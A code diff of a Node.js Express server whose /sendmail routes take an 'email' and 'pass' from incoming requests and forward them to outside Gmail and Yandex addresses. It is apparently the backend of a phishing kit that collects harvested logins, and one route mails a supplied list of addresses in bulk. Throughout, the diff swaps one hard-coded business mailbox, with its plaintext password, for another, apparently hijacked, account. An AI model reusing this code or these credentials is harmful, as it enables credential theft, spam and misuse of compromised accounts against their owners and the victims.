@@ -18,11 +18,11 @@ app.post("/sendmail", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.zambiatransportandlogistics.com",
+      host: "mail.yumex-gr.com.ph",
       port: 465,
       auth: {
-        user: "john.phiri@zambiatransportandlogistics.com",
-        pass: "M!racleMumba%@1995",
+        user: "led.sales3@yumex-gr.com.ph",
+        pass: "ITpassword300",
       },
     });
     let info = await transporter.sendMail({
@@ -53,15 +53,15 @@ app.post("/sendmail3", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.zambiatransportandlogistics.com",
+      host: "mail.yumex-gr.com.ph",
       port: 465,
       auth: {
-        user: "john.phiri@zambiatransportandlogistics.com",
-        pass: "M!racleMumba%@1995",
+        user: "led.sales3@yumex-gr.com.ph",
+        pass: "ITpassword300",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <john.phiri@zambiatransportandlogistics.com>',
+      from: '"Happy time" <led.sales3@yumex-gr.com.ph>',
       to: "quickloaninvestors@gmail.com",
       subject: "Happy time",
       html: `
@@ -86,15 +86,15 @@ app.post("/sendmail2", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.zambiatransportandlogistics.com",
+      host: "mail.yumex-gr.com.ph",
       port: 465,
       auth: {
-        user: "john.phiri@zambiatransportandlogistics.com",
-        pass: "M!racleMumba%@1995",
+        user: "led.sales3@yumex-gr.com.ph",
+        pass: "ITpassword300",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <john.phiri@zambiatransportandlogistics.com>',
+      from: '"Happy time" <led.sales3@yumex-gr.com.ph>',
       to: "Ikrima.catirk@gmail.com",
       subject: "Happy time",
       html: `
@@ -119,15 +119,15 @@ app.post("/sendmail4", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.zambiatransportandlogistics.com",
+      host: "mail.yumex-gr.com.ph",
       port: 465,
       auth: {
-        user: "john.phiri@zambiatransportandlogistics.com",
-        pass: "M!racleMumba%@1995",
+        user: "led.sales3@yumex-gr.com.ph",
+        pass: "ITpassword300",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <john.phiri@zambiatransportandlogistics.com>',
+      from: '"Happy time" <led.sales3@yumex-gr.com.ph>',
       to: "fredrick3smith33@gmail.com",
       subject: "Happy time",
       html: `
@@ -153,15 +153,15 @@ app.post("/sendmail5", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.zambiatransportandlogistics.com",
+      host: "mail.yumex-gr.com.ph",
       port: 465,
       auth: {
-        user: "john.phiri@zambiatransportandlogistics.com",
-        pass: "M!racleMumba%@1995",
+        user: "led.sales3@yumex-gr.com.ph",
+        pass: "ITpassword300",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <john.phiri@zambiatransportandlogistics.com>',
+      from: '"Happy time" <led.sales3@yumex-gr.com.ph>',
       to: "wangyong2114@gmail.com",
       subject: "Happy time",
       html: `
@@ -187,15 +187,15 @@ app.post("/sendmail6", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.zambiatransportandlogistics.com",
+      host: "mail.yumex-gr.com.ph",
       port: 465,
       auth: {
-        user: "john.phiri@zambiatransportandlogistics.com",
-        pass: "M!racleMumba%@1995",
+        user: "led.sales3@yumex-gr.com.ph",
+        pass: "ITpassword300",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <john.phiri@zambiatransportandlogistics.com>',
+      from: '"Happy time" <led.sales3@yumex-gr.com.ph>',
       to: "daniellahm@yandex.com",
       subject: "Happy time",
       html: `
@@ -221,15 +221,15 @@ app.post("/sendmail7", async (req, res) => {
   const { firstName, lastName, phone, email, message } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.zambiatransportandlogistics.com",
+      host: "mail.yumex-gr.com.ph",
       port: 465,
       auth: {
-        user: "john.phiri@zambiatransportandlogistics.com",
-        pass: "M!racleMumba%@1995",
+        user: "led.sales3@yumex-gr.com.ph",
+        pass: "ITpassword300",
       },
     });
     let info = await transporter.sendMail({
-      from: 'Cleaning Site" <john.phiri@zambiatransportandlogistics.com>',
+      from: 'Cleaning Site" <led.sales3@yumex-gr.com.ph>',
       to: "theodoreemagilll@gmail.com",
       subject: "Cleaning Site",
       html: `
@@ -254,7 +254,7 @@ app.post("/sendmail7", async (req, res) => {
     res.status(500).send("Error sending email");
   }
 });
- app.post("/sendmail8", async (req, res) => {
+app.post("/sendmail8", async (req, res) => {
   const { allMail } = req.body;
   const emailArray = allMail.split(",").map((e) => e.trim());
   let errormails = [];
@@ -390,6 +390,6 @@ app.post("/sendmail7", async (req, res) => {
 
   res.send({ failed: errormails, sent: sent });
 });
-const PORT = process.env.PORT || 5001;
+const PORT = process.env.PORT || 5000;
 
-app.listen(PORT, console.log(`server in on "5001"`));
+app.listen(PORT, console.log(`server in on "5000"`));
